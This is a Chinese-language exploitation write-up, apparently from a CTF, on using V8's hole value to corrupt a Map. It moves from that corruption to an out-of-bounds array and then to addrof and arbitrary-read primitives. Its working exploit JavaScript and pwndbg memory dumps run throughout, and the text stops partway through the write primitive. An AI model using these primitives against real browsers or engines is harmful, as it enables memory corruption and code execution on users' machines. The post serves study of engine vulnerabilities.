<p>ËøôÁØáÊñáÁ´†Â§ßÊ¶ÇËÆ≤Ëø∞‰∫Ü V8 ÂØπ TheHole ÁöÑÁâπÊÆäÂ§ÑÁêÜÔºàÂÖ∑‰ΩìÊÄé‰πàÂ§ÑÁêÜÁöÑÊöÇÊó∂‰∏çÊ∏ÖÊ•öÔºâÔºåÂà©Áî®Ëøô‰∏™ÁâπÊÄßÔºåÂèØ‰ª•ÂØπ <code>Map</code> ËøõË°åÁ†¥Âùè</p>
<p>POC Â¶Ç‰∏ãÔºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="comment">/* Áî±‰∫éÂØπÂ≠îÂÄºÁöÑÁâπÊÆäÂ§ÑÁêÜ,ËøôÊúÄÁªàÂ∞Ü Map ÁöÑÂ§ßÂ∞èËÆæÁΩÆ‰∏∫&quot;-1&quot; */</span></span><br><span class="line">map.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.set(hole, <span class="number">1</span>);</span><br><span class="line">map.delete(hole);</span><br><span class="line">map.delete(hole);</span><br><span class="line">map.delete(<span class="number">1</span>);</span><br><span class="line"><span class="comment">/* print(map.size); Size is now -1 */</span></span><br></pre></td></tr></table></figure>
<p>ÂÖàÊü•ÁúãËøô‰∏™ hole ÂíåÈ¢òÁõÆ‰∏≠ÁöÑ hole ÊñπÊ≥ïÊúâ‰ªÄ‰πàÂÖ≥Á≥ªÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Isolate::clear_pending_exception</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DCHECK(!thread_local_top()-&gt;pending_exception_.IsException(<span class="keyword">this</span>));</span><br><span class="line">    thread_local_top()-&gt;pending_exception_ = ReadOnlyRoots(<span class="keyword">this</span>).the_hole_value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>the_hole_value</code> Âú®Êú¨È¢òÁöÑ path ‰∏≠‰πüÂá∫Áé∞Ëøá</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(hole); </span><br><span class="line">DebugPrint: <span class="number">0x37c70800242d</span>: [Oddball] in ReadOnlySpace: <span class="meta">#hole</span></span><br></pre></td></tr></table></figure>
<ul>
<li>‰ΩøÁî® <code>DebugPrint</code> ÂèØ‰ª•ÂèëÁé∞ hole ÊòØ <code>Oddball</code> ÂºïÁî®Á±ªÂûã</li>
</ul>
<p>ÂÖ∑‰ΩìÁöÑÁªÜËäÇÊöÇÊó∂‰∏çÁî®ÁÆ°ÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÁü•ÈÅìËøô‰∏™ POC ÂèØ‰ª•Á†¥Âùè <code>Map</code> Â∞±Ë°å‰∫Ü</p>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>ÂÖà‰æùËë´Ëä¶ÁîªÁì¢Êää POC ‰∏≠ÁöÑÂà©Áî®Â§çÂàª‰∏Ä‰ªΩÔºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">print(map.size);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  x64.release git:(<span class="number">63</span>cb7fb817) ‚úó ./d8 ./<span class="built_in">exp</span>.js</span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ÊàêÂäüÂ∞Ü <code>Map</code> ËøõË°å‰∫ÜÁ†¥Âùè</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m);</span><br><span class="line">DebugPrint: <span class="number">0x14080004ba05</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1408001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x140800186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x140800186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x140800002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x14080004baad</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x140800002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x1408001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1408001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x1408000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x140800186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x140800186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1408001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x1408001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1408000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊâìÂç∞ÂØπÂ∫îÁöÑ <code>table</code>ÔºöÔºàÊ≠§Êó∂ <code>Map</code> Â∑≤ÁªèË¢´Á†¥ÂùèÔºåÂú® <code>Map.size == -1</code> ÁöÑÊÉÖÂÜµ‰∏ãÔºå‰∏çËÉΩ‰ΩøÁî® <code>job</code> ÂëΩ‰ª§Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x14080004baad</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x14080004baac</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x14080004babc</span>:	<span class="number">0x00000004</span>	<span class="number">0xfffffffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004bacc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004badc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004baec</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖàÊâßË°å‰∏ÄÊ¨° <code>m.set(0x8,-1)</code> ÂêéÂÜçÊ¨°ÊâìÂç∞ <code>table</code>ÔºöÔºàÁé∞Âú®ÂèØ‰ª•‰ΩøÁî® <code>job</code> ÂëΩ‰ª§Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x14080004baad</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x14080004baac</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x14080004babc</span>:	<span class="number">0x00000010</span>	<span class="number">0xfffffffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004bacc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004badc</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x14080004baec</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Êñ∞ÂÜôÂÖ•ÁöÑ <code>0x10</code>(JS num:8) Ë¶ÜÁõñ‰∫Ü <code>table + 0x10</code> ÁöÑ‰ΩçÁΩÆÔºàBucket data[-1]ÔºâÔºåËÄå‰∏äÈù¢ÊèêÂà∞Ëøô‰∏™‰ΩçÁΩÆÂ∞±ÊòØ <code>Map capacity</code></li>
<li>Ê≠£Âõ†‰∏∫Â¶ÇÊ≠§ÔºåÂ≠òÂÇ®Ê°∂Ë¢´Êâ©Â±ï‰∫ÜÔºåÂÖÉÁ¥† Entry ÁöÑ‰ΩçÁΩÆ‰πü‰ºöÊîπÂèòÔºàÂÖ∂ÂÆûËøôÈáåÂπ∂‰∏çÊòØ Entry ÁöÑ‰ΩçÁΩÆÂèëÁîü‰∫ÜÊîπÂèòÔºåËÄåÊòØ V8 ‰∏∫‰∫ÜÈ¢ÑÁïô Bucket data ÁöÑÁ©∫Èó¥ÔºåËÄåËÆ§‰∏∫ Entry ÁöÑ‰ΩçÁΩÆÂêëÂêéËøõË°å‰∫ÜÁßªÂä®Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x14080004baad</span></span><br><span class="line"><span class="number">0x14080004baad</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">0</span></span><br><span class="line"> - deleted: <span class="number">0</span></span><br><span class="line"> - buckets: <span class="number">8</span></span><br><span class="line"> - capacity: <span class="number">16</span></span><br><span class="line"> - buckets: &#123;</span><br><span class="line">              <span class="number">0</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">2</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">3</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">4</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">5</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">6</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">7</span>: <span class="number">0x1408000023e1</span> &lt;undefined&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>Âõ†Ê≠§‰øÆÊîπ POC ‰∏∫Ôºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">m.set(c.hole(), <span class="number">1</span>);</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(c.hole());</span><br><span class="line">m.delete(<span class="number">1</span>);</span><br><span class="line">oob_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊâìÂç∞ JSMap Âíå JSArray ÂØπË±°ÁöÑÂÜÖÂ≠ò‰ø°ÊÅØÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m)</span><br><span class="line">DebugPrint: <span class="number">0x233e0004ba25</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x233e001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x233e00186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x233e00186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x233e0004bacd</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">d8&gt; %DebugPrint(oob_arr)</span><br><span class="line">DebugPrint: <span class="number">0x233e0004bb19</span>: [JSArray]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x233e0018e6bd</span> &lt;Map[<span class="number">16</span>](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x233e0018e11d</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x233e0004bb29</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">2</span></span><br><span class="line"> - properties: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x233e00006551</span>: [String] in ReadOnlySpace: <span class="meta">#length: 0x233e00144255 <span class="meta-string">&lt;AccessorInfo name= 0x233e00006551 &lt;String[6]: #length&gt;</span>, data= 0x233e000023e1 <span class="meta-string">&lt;undefined&gt;</span>&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x233e0004bb29</span> &lt;FixedDoubleArray[<span class="number">2</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2.2</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr</code> Âíå <code>m-&gt;table</code> ÁöÑ‰ΩçÁΩÆÂæàÊé•ËøëÔºà<code>0x233e0004bacd + 0x4c == 0x233e0004bb19</code>Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x233e0004bb19</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x233e0004bb18</span>:	<span class="number">0x0018e6bd</span>	<span class="number">0x00002259</span>	<span class="number">0x0004bb29</span>	<span class="number">0x00000004</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr+0x8</code>Ôºà<code>table+0x54</code>ÔºâÔºö<code>oob_arr-&gt;elements</code></li>
<li><code>oob_arr+0xc</code>Ôºà<code>table+0x58</code>ÔºâÔºö<code>oob_arr-&gt;length</code></li>
</ul>
<p>ÂÖàÊâßË°å‰∏ÄÊ¨° <code>m.set(0x10,-1)</code> ÂêéÂÜçÊ¨°ÊâìÂç∞ <code>table</code>Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x233e0004bacd</span></span><br><span class="line"><span class="number">0x233e0004bacd</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">0</span></span><br><span class="line"> - deleted: <span class="number">0</span></span><br><span class="line"> - buckets: <span class="number">16</span></span><br><span class="line"> - capacity: <span class="number">32</span></span><br><span class="line"> - buckets: &#123;</span><br><span class="line">              <span class="number">0</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">-1</span></span><br><span class="line">              <span class="number">2</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">3</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">4</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">5</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">6</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">7</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">8</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">              <span class="number">9</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">10</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">11</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">12</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">             <span class="number">13</span>: <span class="number">0x233e000023e1</span> &lt;undefined&gt;</span><br><span class="line">                 <span class="comment">/* Âà∞ËøôÈáåÂ∑≤ÁªèËøõÂÖ•oob_arrÁöÑÂå∫Âüü‰∫Ü */</span></span><br><span class="line">             <span class="number">14</span>: <span class="number">0x233e0018e6bd</span> &lt;Map[<span class="number">16</span>](PACKED_DOUBLE_ELEMENTS)&gt; </span><br><span class="line">             <span class="number">15</span>: <span class="number">0x233e00002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Áî±‰∫é <code>Map</code> ÁöÑÂÆπÈáèË¢´Ë¶ÜÁõñ‰∏∫32ÔºåËøôÊÑèÂë≥ÁùÄÂ≠òÂÇ®Ê°∂Êâ©Â±ïÂà∞16</li>
<li>Áî±‰∫éÂ≠òÂÇ®Ê°∂ÁöÑÊâ©Â±ïÔºåÂÖÉÁ¥†ÊåáÈíà Entry ÂêëÂêéÁßªÂä®‰∫Ü <code>(16-2)*0x4 = 0x38</code> Â≠óËäÇ</li>
<li>ÊâÄ‰ª•Ôºå‰πãÂâçÊò†Â∞ÑÈîÆÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥† Entry Â≠òÂÇ®Âú® <code>table+0x1c</code> ‰∏≠ÔºåÁé∞Âú®ÂÆÉÂ∞ÜÂ≠òÂÇ®Âú® <code>table+0x54</code> ‰∏≠</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>xw <span class="number">0x233e0004bacd</span><span class="number">-1</span>+<span class="number">0x54</span></span><br><span class="line"><span class="number">0x233e0004bb20</span>:	<span class="number">0x0004bb29</span>	<span class="number">0x00000004</span>	<span class="number">0x00002ac1</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x233e0004bb30</span>:	<span class="number">0x9999999a</span>	<span class="number">0x3ff19999</span>	<span class="number">0x9999999a</span>	<span class="number">0x40019999</span></span><br></pre></td></tr></table></figure>
<ul>
<li>‰ΩÜÊòØ <code>table+0x54</code> ÊòØÂ≠òÂÇ®ÁöÑÂÖÉÁ¥† <code>oob_arr</code> ÊåáÈíàÔºå<code>table+0x58</code> ÊòØ <code>oob_arr</code> ÈïøÂ∫¶</li>
<li>Âõ†Ê≠§ÔºåÂú®ÊçüÂùè‰πãÂêéÔºåÂ¶ÇÊûúÊàë‰ª¨Á¨¨‰∏âÊ¨°Ë∞ÉÁî® <code>map.set</code>ÔºåÂÆÉÂ∞ÜË¶ÜÁõñ <code>oob_arr</code> ÂÖÉÁ¥†ÁöÑÊåáÈíàÂíåÈïøÂ∫¶ÔºåÈÄöËøáËøõ‰∏ÄÊ≠•ÁöÑÊäÄÊúØÔºåÊàë‰ª¨Â∞ÜËÉΩÂ§ü‰ΩøÁî®ÊçüÂùèÁöÑ <code>oob_arr</code> ‰Ωú‰∏∫Êàë‰ª¨ÁöÑËØªÂÜôÂü∫ÂÖÉ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; m.<span class="built_in">set</span>(oob_arr, <span class="number">0xffff</span>);</span><br><span class="line">[object Map]</span><br><span class="line">d8&gt; oob_arr.length</span><br><span class="line"><span class="number">65535</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>xw <span class="number">0x233e0004bacd</span><span class="number">-1</span>+<span class="number">0x54</span></span><br><span class="line"><span class="number">0x233e0004bb20</span>:	<span class="number">0x0004bb19</span>	<span class="number">0x0001fffe</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x233e0004bb30</span>:	<span class="number">0x9999999a</span>	<span class="number">0x3ff19999</span>	<span class="number">0x9999999a</span>	<span class="number">0x40019999</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>oob_arr</code> ÁöÑÈïøÂ∫¶Â∑≤ÁªèË¢´‰øÆÊîπ‰∫ÜÔºåÂÆåÊàê‰∫Ü Array OOB Êï∞ÁªÑË∂äÁïå</li>
</ul>
<p>Áé∞Âú®Êàë‰ª¨Êúâ‰∏Ä‰∏™ÂèØ‰ª•ËøõË°å OOB ËØªÂÜôÁöÑÊï∞ÁªÑÔºå‰∏∫‰∫ÜÊéßÂà∂ RIPÔºåÊàë‰ª¨ÈúÄË¶ÅËÉΩÂ§üÊâßË°åÔºö</p>
<ul>
<li>addrofÔºöËé∑ÂèñÂØπË±°ÁöÑÂú∞ÂùÄ<ul>
<li>ÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ victims ÁöÑÊñ∞ÂèòÈáèÔºåÂÆÉÊòØ‰∏Ä‰∏™Á©∫ÂØπË±°ÁöÑÊï∞ÁªÑ</li>
<li>Â∞ÜÁõÆÊ†áÂØπË±°ÂàÜÈÖçÁªô victims Êï∞ÁªÑÁöÑÂÖÉÁ¥†‰πã‰∏Ä</li>
<li>‰ΩøÁî®‰ªé <code>oob_arr</code> ËØªÂèñÁöÑ OOBÔºåËØªÂèñÂèóÂÆ≥ËÄÖÂÖÉÁ¥†ÁöÑÂ≠òÂÇ®ÂÄºÔºàÂç≥ÁõÆÊ†áÂØπË±°Âú∞ÂùÄÔºâ</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">victim = [&#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>) </span>&#123;</span><br><span class="line">    mask = (<span class="number">1n</span> &lt;&lt; <span class="number">32n</span>) - <span class="number">1n</span></span><br><span class="line">    victim[<span class="number">0</span>] = in_obj;</span><br><span class="line">    <span class="keyword">return</span> ftoi(oob_arr[<span class="number">12</span>]) &amp; mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>readÔºöËØªÂèñÁªôÂÆöÂú∞ÂùÄÁöÑÂÄºÔºàRAAÔºâ<ul>
<li>ÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ read_gadget ÁöÑÊï∞ÁªÑÔºåËØ•Êï∞ÁªÑÁî±ÊµÆÁÇπÂÄºÁªÑÊàê</li>
<li>‰ΩøÁî® OOB ‰ªé <code>oob_arr</code> ÂÜôÂÖ•ÔºåÂà©Áî®Ê∫¢Âá∫Ë¶ÜÁõñ <code>read_gadget[0]</code>Ôºå‰ΩøÂÖ∂ÊåáÂêë <code>target_addr-0x8</code>ÔºàÊï∞ÁªÑÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Â≠òÂÇ®Âú® <code>elements+0x8</code> ‰∏≠Ôºâ</li>
<li>ËøîÂõû <code>read_gadget[0]</code></li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read_gadget = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">weak_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    oob_arr[<span class="number">37</span>] = itof(<span class="number">0x600000000n</span>+addr-<span class="number">0x8n</span>);</span><br><span class="line">    <span class="keyword">return</span> ftoi(read_gadget[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>writeÔºöÂ∞ÜÂÄºÂÜôÂÖ•ÁªôÂÆöÂú∞ÂùÄÔºàWAAÔºâ<ul>
<li>ÂâçÈù¢Âíå read Á±ª‰ºº</li>
